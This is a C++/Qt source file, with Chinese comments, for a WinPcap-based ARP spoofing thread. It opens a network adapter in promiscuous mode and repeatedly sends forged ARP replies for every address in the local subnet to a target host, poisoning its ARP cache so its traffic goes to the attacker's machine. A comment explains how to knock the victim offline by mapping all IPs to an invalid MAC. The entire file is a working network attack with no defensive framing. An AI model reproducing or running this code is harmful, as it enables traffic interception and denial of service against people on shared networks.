#include "arpattackthread.h"

ArpAttackThread::ArpAttackThread(QObject *parent) : QThread(parent)
{

}
ArpAttackThread::ArpAttackThread(uint32_t atkIPAddr,uint8_t* atkMacAddr,uint32_t curIPAddr,uint32_t broadcastAddr,uint32_t networkAddr,const uint8_t* curMacAddr,QString adapterName,QObject *parent): QThread(parent)
{
    mCurIPAddr = curIPAddr;
    mBroadcastAddr = broadcastAddr;
    mNetworkAddr = networkAddr;
    mAtkIPAddr = atkIPAddr;
    memcpy(mCurMacAddr,curMacAddr,sizeof(uint8_t)*6);
    memcpy(mAtkMacAddr,atkMacAddr,sizeof(uint8_t)*6);

    char errbuf[PCAP_ERRBUF_SIZE];
    // 打开设备
    if ((this->mAdapterHandle = pcap_open(adapterName.toLatin1().data(),          // 设备名
                                          65536,            // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容
                                          PCAP_OPENFLAG_PROMISCUOUS,    // 混杂模式
                                          1000,             // 读取超时时间
                                          nullptr,             // 远程机器验证
                                          errbuf            // 错误缓冲池
                                          )) == nullptr)
    {
        qDebug() << "设备打开失败!!!!" ;
    }
}
void ArpAttackThread::run(){
    if( this->mAdapterHandle == nullptr){
        qDebug() << "网卡设备没有开启";
        return;
    }
    char tmp[18] = {0};

    // 构造ARP请求包 ，2字节及以上的 存在大小端对齐问题，需要转换为网络字节序
    ArpPackage package;

    // 以太网 头部
    memcpy(package.ethHead.destEthAddr,this->mAtkMacAddr,6);
    memcpy(package.ethHead.srcEthAddr,this->mCurMacAddr,6);
    package.ethHead.frameType = htons(0x0806);

    Utils::macToHexString(package.ethHead.srcEthAddr,tmp);

    // 构造ARP请求体内容
    package.arpBody.hardType = htons(1);// 以太网地址
    package.arpBody.protocolType = htons(0x0800); // IP地址
    package.arpBody.hardLen = 6;
    package.arpBody.protocolLen = 4;
    package.arpBody.op = htons(2);  // ARP应答包

    memcpy(package.arpBody.destEthAddr,this->mAtkMacAddr,6);
    memcpy(package.arpBody.srcEthAddr,this->mCurMacAddr,6);
    Utils::htonN(reinterpret_cast<uint8_t*>(&this->mAtkIPAddr),package.arpBody.destIpAddr,4);

    // 发送ARP应答包 欺骗目的主机
    while(true){
        if(this->isAttack == false)
            break;
        // 发送ARP应答包，将攻击目标 ARP缓存中的 局域网中所有的MAC地址 全部改为自己，达到ARP欺骗的目的
        // 如果想让对方 不能上网，很简单 将0.0.0.0-255.255.255.255 所有IP都给对应的MAC地址 改为无效的MAC 就能达到
        for(uint32_t ipAddr = mNetworkAddr+1; ipAddr < mBroadcastAddr; ipAddr++){
            if( ipAddr == this->mAtkIPAddr)
                continue;

            struct in_addr addr;
            addr.S_un.S_addr = htonl(ipAddr);
            qDebug() << inet_ntoa( addr);

            Utils::htonN(reinterpret_cast<uint8_t*>(&(ipAddr)),package.arpBody.srcIpAddr,4);
            int ret = pcap_sendpacket(this->mAdapterHandle,reinterpret_cast<unsigned char*>(&package),42);
            if( ret != 0){
                qDebug() << inet_ntoa( addr) << " 发送失败！" ;
            }
            Sleep(100);
        }
        Sleep(3000);
    }
    // 关闭设备
    pcap_close(this->mAdapterHandle);

    // 已经停止ARP欺骗
    emit stopDone();
}

void ArpAttackThread::stopAttack(){
    this->isAttack = false;
}
